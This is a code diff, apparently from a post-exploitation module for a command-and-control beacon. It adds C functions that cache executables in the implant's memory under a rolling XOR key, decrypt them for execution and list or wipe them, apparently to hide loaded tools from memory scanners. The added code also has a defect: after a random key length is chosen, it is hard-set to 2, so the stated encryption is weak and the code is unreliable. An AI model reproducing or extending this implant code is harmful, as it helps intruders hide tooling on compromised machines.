@@ -267,3 +267,308 @@ Cleanup:
 
     return ret_val;
 }
+
+VOID run_xor_on_pe(
+    IN PSAVED_PE saved_pe)
+{
+    PBYTE xor_key = NULL;
+    BYTE  tmp     = 0;
+
+    xor_key = intAlloc(saved_pe->xor_length);
+    memcpy(xor_key, saved_pe->xor_key, saved_pe->xor_length);
+
+    if (saved_pe->encrypted)
+    {
+        // decrypt
+        for (int i = 0; i < saved_pe->pe_size; ++i)
+        {
+            tmp = saved_pe->pe_base[i];
+            saved_pe->pe_base[i] ^= xor_key[i % saved_pe->xor_length];
+            xor_key[i % saved_pe->xor_length] = tmp;
+        }
+    }
+    else
+    {
+        // encrypt
+        for (int i = 0; i < saved_pe->pe_size; ++i)
+        {
+            saved_pe->pe_base[i] ^= xor_key[i % saved_pe->xor_length];
+            xor_key[i % saved_pe->xor_length] = saved_pe->pe_base[i];
+        }
+    }
+
+    memset(xor_key, 0, saved_pe->xor_length);
+    intFree(xor_key);
+    saved_pe->encrypted = !saved_pe->encrypted;
+}
+
+BOOL save_pe_info(
+    IN LPSTR pe_name,
+    IN PBYTE pe_bytes,
+    IN int   pe_length,
+    IN LPSTR username,
+    IN LPSTR loadtime)
+{
+    PSAVED_PE saved_pe = NULL;
+    PSAVED_PE tmp      = NULL;
+    time_t   t         = { 0 };
+
+    if (!pe_name || !pe_bytes || !pe_length)
+        return TRUE;
+
+    VOID (WINAPI *srand) (int) = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "srand", 0);
+    int (WINAPI *rand) (void)  = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "rand", 0);
+    time_t (WINAPI* time) (time_t*) = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "time", 0);
+
+    if (!srand)
+    {
+        api_not_found("srand");
+        return FALSE;
+    }
+
+    if (!rand)
+    {
+        api_not_found("rand");
+        return FALSE;
+    }
+
+    if (!time)
+    {
+        api_not_found("time");
+        return FALSE;
+    }
+
+    // check the PE is not already saved
+    tmp = BeaconGetValue(NC_PE_INFO_KEY);
+    while (tmp)
+    {
+        if (!_stricmp(tmp->pe_name, pe_name))
+            break;
+
+        tmp = tmp->next;
+    }
+
+    if (tmp)
+    {
+        DPRINT("The PE %s is already saved", pe_name);
+        return TRUE;
+    }
+
+    // allocate the SAVED_PE structure
+    saved_pe = intAlloc(sizeof(SAVED_PE));
+
+    // generate a random XOR key
+    srand((unsigned) time(&t));
+
+    saved_pe->xor_length = rand() & (256 - 1);
+
+    if (saved_pe->xor_length < MIN_XOR_KEY_LENGTH)
+        saved_pe->xor_length = MIN_XOR_KEY_LENGTH;
+
+    saved_pe->xor_length = 2;
+
+    saved_pe->xor_key = intAlloc(saved_pe->xor_length);
+
+    for (int i = 0; i < saved_pe->xor_length; ++i)
+    {
+        saved_pe->xor_key[i] = rand() & (256 - 1);
+    }
+
+    // store the PE
+    saved_pe->pe_size = pe_length;
+    saved_pe->pe_base = intAlloc(saved_pe->pe_size + 1);
+    if (!saved_pe->pe_base)
+    {
+        function_failed("malloc");
+        return FALSE;
+    }
+
+    memcpy(saved_pe->pe_base, pe_bytes, pe_length);
+
+    // encrypt the PE
+    run_xor_on_pe(saved_pe);
+
+    memcpy(saved_pe->pe_name, pe_name, MAX_PATH);
+    memcpy(saved_pe->username, username, MAX_PATH);
+    memcpy(saved_pe->loadtime, loadtime, MAX_PATH);
+
+    // add PE to linked list
+    tmp = BeaconGetValue(NC_PE_INFO_KEY);
+    if (!tmp)
+    {
+        // save the PE linked list
+        if (!BeaconAddValue(NC_PE_INFO_KEY, saved_pe))
+        {
+            function_failed("BeaconAddValue");
+            return FALSE;
+        }
+    }
+    else
+    {
+        while (tmp)
+        {
+            if (!tmp->next)
+            {
+                tmp->next = saved_pe;
+                break;
+            }
+
+            tmp = tmp->next;
+        }
+    }
+
+    return TRUE;
+}
+
+BOOL get_saved_pe(
+    IN  LPSTR  pe_name,
+    OUT PVOID* data,
+    OUT int*   pelen)
+{
+    PSAVED_PE saved_pe = NULL;
+
+    // look for the PE by name
+    saved_pe = BeaconGetValue(NC_PE_INFO_KEY);
+    while (saved_pe)
+    {
+        if (!_stricmp(saved_pe->pe_name, pe_name))
+            break;
+
+        saved_pe = saved_pe->next;
+    }
+
+    if (!saved_pe)
+    {
+        DPRINT("%s was not found", pe_name);
+        return FALSE;
+    }
+
+    DPRINT("Found %s", saved_pe->pe_name);
+
+    if (saved_pe->encrypted)
+    {
+        // decrypt the PE
+        run_xor_on_pe(saved_pe);
+
+        DPRINT("decrypted binary")
+    }
+
+    *data  = saved_pe->pe_base;
+    *pelen = saved_pe->pe_size;
+
+    return TRUE;
+}
+
+BOOL reencrypt_pe(
+    IN LPSTR pe_name)
+{
+    PSAVED_PE saved_pe = NULL;
+
+    // look for the PE by name
+    saved_pe = BeaconGetValue(NC_PE_INFO_KEY);
+    while (saved_pe)
+    {
+        if (!_stricmp(saved_pe->pe_name, pe_name))
+            break;
+
+        saved_pe = saved_pe->next;
+    }
+
+    if (!saved_pe)
+    {
+        DPRINT("%s was not found", pe_name);
+        return FALSE;
+    }
+
+    if (saved_pe->encrypted)
+        return TRUE;
+
+    // encrypt the PE
+    run_xor_on_pe(saved_pe);
+
+    DPRINT("reencrypted %s", saved_pe->pe_name);
+
+    return TRUE;
+}
+
+VOID list_saved_pes()
+{
+    PSAVED_PE saved_pe = NULL;
+
+    saved_pe = BeaconGetValue(NC_PE_INFO_KEY);
+    if (!saved_pe)
+    {
+        PRINT("There are no saved PEs in memory");
+    }
+    else
+    {
+        PRINT("Saved PEs:");
+        while (saved_pe)
+        {
+            PRINT("- name: %s, loaded by: %s, time: %s", saved_pe->pe_name, saved_pe->username, saved_pe->loadtime);
+            saved_pe = saved_pe->next;
+        }
+    }
+}
+
+BOOL remove_saved_pe(
+    IN  LPSTR  pe_name)
+{
+    PSAVED_PE saved_pe = NULL;
+    PSAVED_PE tmp      = NULL;
+
+    // look for the PE by name
+    saved_pe = BeaconGetValue(NC_PE_INFO_KEY);
+    while (saved_pe)
+    {
+        if (!_stricmp(saved_pe->pe_name, pe_name))
+        {
+            // remove PE from linked list
+            if (!tmp)
+            {
+                if (saved_pe->next)
+                {
+                    if (!BeaconAddValue(NC_PE_INFO_KEY, saved_pe->next))
+                    {
+                        function_failed("BeaconAddValue");
+                        return FALSE;
+                    }
+                }
+                else
+                {
+                    if (!BeaconRemoveValue(NC_PE_INFO_KEY))
+                    {
+                        function_failed("BeaconRemoveValue");
+                        return FALSE;
+                    }
+                }
+            }
+            else
+            {
+                tmp->next = saved_pe->next;
+            }
+
+            break;
+        }
+
+        tmp = saved_pe;
+        saved_pe = saved_pe->next;
+    }
+
+    if (!saved_pe)
+    {
+        DPRINT("%s was not found", pe_name);
+        return FALSE;
+    }
+
+    memset(saved_pe->xor_key, 0, saved_pe->xor_length);
+    intFree(saved_pe->xor_key);
+
+    memset(saved_pe->pe_base, 0, saved_pe->pe_size);
+    intFree(saved_pe->pe_base);
+
+    memset(saved_pe, 0, sizeof(SAVED_PE));
+    intFree(saved_pe);
+
+    return TRUE;
+}
